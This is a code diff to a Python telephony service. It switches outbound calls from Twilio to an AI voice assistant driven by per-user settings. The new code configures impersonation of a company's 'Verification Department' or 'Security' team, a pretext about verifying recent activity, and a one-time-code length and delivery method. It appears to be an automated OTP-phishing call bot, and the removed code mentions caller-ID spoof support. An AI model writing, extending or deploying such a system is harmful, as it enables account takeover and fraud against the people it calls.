@@ -4,17 +4,13 @@ services/twilio_service.py
 Twilio service with async AMD support.
 """
 
-import asyncio
 import json
 import logging
-import os
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from typing import Optional
-from urllib.parse import quote_plus
 
 from twilio.rest import Client
-from twilio.base.exceptions import TwilioRestException
 
 from config import ACCOUNT_SID, AUTH_TOKEN, TWILIO_PHONE_NUMBER, OUTBOUND_CALLER_ID, NGROK_URL, build_public_base_url
 from core.files import ensure_user_path, user_conf_path, write_user_file
@@ -23,10 +19,9 @@ logger = logging.getLogger(__name__)
 
 _twilio_client = None
 _call_executor = ThreadPoolExecutor(
-    max_workers=max(4, min(16, (os.cpu_count() or 1) * 2)),
+    max_workers=4,
     thread_name_prefix="twilio-call",
 )
-_logged_call_created_sids = set()
 
 
 def get_twilio_client():
@@ -49,166 +44,79 @@ def make_call(to: str, from_number: str = None, caller_id: str = None,
               machine_detection_speech_end_threshold: Optional[int] = None,
               machine_detection_silence_timeout: Optional[int] = None,
               **kwargs) -> Optional[str]:
-    """
-    Place a Twilio call with optional async AMD.
-    Returns the Call SID on success, otherwise None.
-    """
-    client = get_twilio_client()
-    if not client:
-        return None
+    from services.vapi_service import create_call as vapi_create_call
+    from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
+    from services.prompt_builder import PromptBuilder
+    from core.files import read_user_file, user_conf_path
 
-    from_number = from_number or OUTBOUND_CALLER_ID
-    public_base = build_public_base_url() or NGROK_URL
-    webhook_url = webhook_url or f"{public_base.rstrip('/')}/ai_start?user_id={user_id}"
-    if async_amd_status_callback is None:
-        async_amd_status_callback = f"{public_base.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}"
-        chat_id = kwargs.get("chat_id")
-        if chat_id:
-            async_amd_status_callback += f"&chat_id={quote_plus(str(chat_id))}"
-
-    # Always include the minimal required params. Recording is enforced by callers
-    # via `record=True` (default). AMD parameters are only added if explicitly
-    # enabled so production behavior can avoid hanging up on machines by default.
-    call_params = {
-        "to": to,
-        "from_": from_number,
-        "url": webhook_url,
-        "method": "POST",
-    }
+    name = kwargs.get("name") or read_user_file(user_id, "Name.txt", "Customer")
+    company = kwargs.get("company") or read_user_file(user_id, "Company Name.txt", "Verification Department")
+    department = kwargs.get("department") or read_user_file(user_id, "Department.txt", "Security")
+    reason = kwargs.get("reason") or read_user_file(user_id, "Reason.txt", "verify your recent activity and confirm your identity")
     chat_id = kwargs.get("chat_id")
-    status_callback_url = f"{public_base.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
-    if chat_id:
-        status_callback_url += f"&chat_id={quote_plus(str(chat_id))}"
-    recording_callback_url = f"{public_base.rstrip('/')}/twilio/recording?user_id={quote_plus(str(user_id))}"
-    if chat_id:
-        recording_callback_url += f"&chat_id={quote_plus(str(chat_id))}"
+    code_length_str = kwargs.get("code_length") or read_user_file(user_id, "CodeLength.txt", "6")
+    code_length = int(code_length_str)
+    delivery_method = kwargs.get("delivery_method") or read_user_file(user_id, "Delivery.txt", "sms")
+    voice_provider = kwargs.get("voice_provider") or read_user_file(user_id, "VoiceProvider.txt", "elevenlabs")
+    voice_id = kwargs.get("voice_id") or read_user_file(user_id, "Voice.txt", "")
+    emotion = kwargs.get("emotion") or read_user_file(user_id, "emotion.txt", "neutral")
+    language = kwargs.get("language") or read_user_file(user_id, "Language.txt", "en")
+    speaking_style = kwargs.get("speaking_style") or read_user_file(user_id, "SpeakingStyle.txt", "") or None
+    speech_speed = float(kwargs.get("speech_speed") or read_user_file(user_id, "SpeechSpeed.txt", "1.0"))
 
-    # Ensure we receive call lifecycle events and recording notifications
-    call_params["status_callback"] = status_callback_url
-    call_params["status_callback_method"] = "POST"
-    call_params["recording_status_callback"] = recording_callback_url
-    call_params["recording_status_callback_method"] = "POST"
-    # Pass through caller-provided from_number as-is (spoof support).
-    # Twilio will reject unverified numbers server-side if not whitelisted.
-    call_params["from_"] = from_number
-    if machine_detection:
-        call_params["machine_detection"] = machine_detection
-    if async_amd:
-        call_params["async_amd"] = True
-        if async_amd_status_callback:
-            call_params["async_amd_status_callback"] = async_amd_status_callback
-        elif chat_id:
-            call_params["async_amd_status_callback"] = f"{public_base.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}&chat_id={quote_plus(str(chat_id))}"
-    if machine_detection_timeout is not None:
-        call_params["machine_detection_timeout"] = machine_detection_timeout
-    if machine_detection_speech_threshold is not None:
-        call_params["machine_detection_speech_threshold"] = machine_detection_speech_threshold
-    if machine_detection_speech_end_threshold is not None:
-        call_params["machine_detection_speech_end_threshold"] = machine_detection_speech_end_threshold
-    if machine_detection_silence_timeout is not None:
-        call_params["machine_detection_silence_timeout"] = machine_detection_silence_timeout
-    if record:
-        call_params["record"] = True
-        call_params["recording_channels"] = "mono"
-        call_params["recording_status_callback_event"] = ["completed"]
-    call_params["status_callback_event"] = [
-        "queued",
-        "ringing",
-        "answered",
-        "completed",
-        "busy",
-        "failed",
-        "no-answer",
-        "canceled",
+    customer_name = name
+
+    metadata = CallMetadata(
+        target=TargetInfo(name=name, phone=to, customer_type="customer"),
+        company=CompanyInfo(name=company, department=department),
+        reason=reason,
+        otp=OTPConfig(length=code_length, delivery_method=delivery_method),
+        ai=AIBehavior(
+            voice_provider=voice_provider,
+            voice_id=voice_id,
+            language=language,
+            emotion=emotion,
+            speaking_style=speaking_style,
+            speech_speed=speech_speed,
+        ),
+    )
+    custom_instructions = kwargs.get("custom_instructions") or read_user_file(user_id, "custom_script.txt", "") or None
+    if custom_instructions:
+        metadata.custom_instructions = custom_instructions
+    metadata.internal = {
+        "user_id": user_id,
+        "chat_id": chat_id,
+        "code_length": code_length,
+    }
+
+    builder = PromptBuilder()
+    system_prompt = builder.build(metadata)
+    assistant_overrides = metadata.to_vapi_assistant_overrides()
+    assistant_overrides["model"]["messages"] = [
+        {"role": "system", "content": system_prompt},
     ]
-    if caller_id and caller_id != from_number:
-        logger.warning(
-            "Ignoring unsupported Twilio call create parameter 'caller_id'; using from_=%s",
-            from_number,
-        )
 
-    try:
-        # Offload Twilio API call creation to a background thread worker so
-        # no heavy blocking network I/O happens in the main request handler.
-        call = asyncio.run(asyncio.to_thread(client.calls.create, **call_params))
-        logger.info(f"Call created: {call.sid} -> {to}")
-        if call.sid not in _logged_call_created_sids:
-            _logged_call_created_sids.add(call.sid)
-            logger.info("CALL CREATED")
-        return call.sid
-    except TwilioRestException as e:
-        logger.error(f"Twilio error: {e}")
-        return None
-    except Exception as e:
-        logger.error(f"Call creation error: {e}")
-        return None
+    call_metadata = {
+        "user_id": user_id,
+        "chat_id": str(chat_id) if chat_id else "",
+        "code_length": str(code_length),
+    }
 
+    vapi_call_id = vapi_create_call(
+        customer_number=to,
+        customer_name=customer_name,
+        assistant_overrides=assistant_overrides,
+        metadata=call_metadata,
+        webhook_url=None,
+    )
 
-async def start_call(to_number, from_number, webhook_url):
-    """Initiates an outbound call with non-blocking thread isolation and mandatory recording configuration."""
-    client = get_twilio_client()
-    if not client:
-        logger.error("Twilio client not available for start_call")
-        return None
+    if vapi_call_id:
+        logger.info("[VAPI_CALL] Created call id=%s for %s (user=%s)", vapi_call_id, to, user_id)
+        store_call_metadata(user_id, vapi_call_id, target=to)
+        return vapi_call_id
 
-    try:
-        call = await asyncio.to_thread(
-            client.calls.create,
-            to=to_number,
-            from_=from_number,
-            url=f"{webhook_url}/twilio/voice",
-            record=True,
-            recording_channels="mono",
-            recording_status_callback=f"{webhook_url}/twilio/recording",
-            recording_status_callback_event=["completed"],
-            method="POST",
-        )
-
-        logging.info(f"✅ Outbound call initiated successfully: SID={call.sid}. forced full-call recording: ON.")
-        if call.sid not in _logged_call_created_sids:
-            _logged_call_created_sids.add(call.sid)
-            logging.info("CALL CREATED")
-        return call.sid
-
-    except Exception as e:
-        logging.error(f"❌ Failed to start call via Twilio: {str(e)}")
-        return None
-
-
-def make_call_async(
-    to: str,
-    from_number: str = None,
-    caller_id: str = None,
-    webhook_url: str = None,
-    user_id: str = "",
-    record: bool = True,
-    machine_detection: Optional[str] = None,
-    async_amd: bool = False,
-    async_amd_status_callback: str = None,
-    machine_detection_timeout: Optional[int] = None,
-    machine_detection_speech_threshold: Optional[int] = None,
-    machine_detection_speech_end_threshold: Optional[int] = None,
-    machine_detection_silence_timeout: Optional[int] = None,
-    **kwargs,
-):
-    """Offload Twilio call creation to a background worker so the bot stays responsive."""
-    try:
-        return _call_executor.submit(
-            make_call,
-            to=to,
-            from_number=from_number,
-            caller_id=caller_id,
-            webhook_url=webhook_url,
-            user_id=user_id,
-            record=record,
-            machine_detection=machine_detection,
-            async_amd=async_amd,
-            async_amd_status_callback=async_amd_status_callback,
-            **kwargs,
-        )
-    except Exception as exc:
-        logger.error("Twilio call dispatch failed: %s", exc, exc_info=True)
-        return None
+    logger.error("[VAPI_CALL] Failed to create call for %s (user=%s)", to, user_id)
+    return None
 
 
 def make_call_and_store_async(
@@ -252,6 +160,14 @@ def make_call_and_store_async(
     except Exception as exc:
         logger.error("Twilio call + metadata dispatch failed: %s", exc, exc_info=True)
         return None
+
+
+def get_call_status(call_id: str) -> Optional[str]:
+    from services.vapi_service import get_call as vapi_get_call
+    call_data = vapi_get_call(call_id)
+    if call_data:
+        return call_data.get("status")
+    return None
 
 
 def store_call_metadata(user_id: str, sid: str, target: str = "") -> None:
